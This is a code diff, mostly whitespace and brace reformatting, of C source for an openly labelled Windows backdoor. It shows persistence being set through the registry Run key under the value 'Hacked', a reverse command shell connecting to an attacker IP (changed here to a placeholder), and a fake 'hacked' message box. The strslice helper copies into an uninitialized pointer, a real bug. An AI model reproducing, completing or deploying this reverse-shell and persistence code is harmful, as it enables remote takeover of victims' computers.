@@ -16,11 +16,12 @@ int sock;
 
 char *strslice(const char *str, size_t start, size_t end)
 {
-	if (start > end) {
+	if (start > end)
+	{
 		return NULL;
 	}
 	char *result;
-    strncpy(result, str + start, end - start);
+	strncpy(result, str + start, end - start);
 	return result;
 }
 
@@ -29,21 +30,24 @@ int bootRun()
 	char err[128] = "Failed\n";
 	char success[128] = "Created persistence at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
 	TCHAR szPath[MAX_PATH]; // Win32 char string (MAX_PATH = 256)
-	DWORD pathLen = 0; // double word - unsigned 32-bit int
+	DWORD pathLen = 0;		// double word - unsigned 32-bit int
 
 	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); // returns the path of the malware
-	if (pathLen == 0) { 
+	if (pathLen == 0)
+	{
 		send(sock, err, sizeof(err), 0);
 		return -1;
 	}
 
 	HKEY NewVal; // opens windows registry and creates new entry
-	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
+	{
 		send(sock, err, sizeof(err), 0);
 		return -1;
 	}
 	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
-	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
+	{
 		RegCloseKey(NewVal);
 		send(sock, err, sizeof(err), 0);
 		return -1;
@@ -61,7 +65,7 @@ void Shell()
 
 	while (true)
 	{
-		jump:
+	jump:
 		memset(buffer, 0, sizeof(buffer));
 		memset(container, 0, sizeof(container));
 		memset(total_response, 0, sizeof(total_response));
@@ -73,7 +77,7 @@ void Shell()
 			WSACleanup();	   // windows cleanup
 			exit(0);
 		}
-		else if (strncmp("cd ", buffer, 3) == 0) 
+		else if (strncmp("cd ", buffer, 3) == 0)
 		{
 			chdir(strslice(buffer, 3, 100)); // removes first 3 chars from buffer
 		}
@@ -112,8 +116,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	char *ServIP;
 	WSADATA wsaData;
 
-	ServIP = "192.168.0.99"; // IP address from attacker (ifconfig - inet)
-	ServPort = 50005;		 // Listening port
+	ServIP = "xxx.xxx.x.xx"; // IP address from attacker (ifconfig - inet)
+	ServPort = 69696;		 // Listening port
 
 	if ((WSAStartup(MAKEWORD(2, 0), &wsaData)) != 0)
 	{
@@ -139,5 +143,5 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 		}
 	}
 	MessageBox(NULL, TEXT("Your computer has been hacked!"), TEXT("Windows installer"), MB_OK | MB_ICONERROR); // spooky message lol
-	Shell(); // initializes windows cmd
+	Shell();																								   // initializes windows cmd
 }
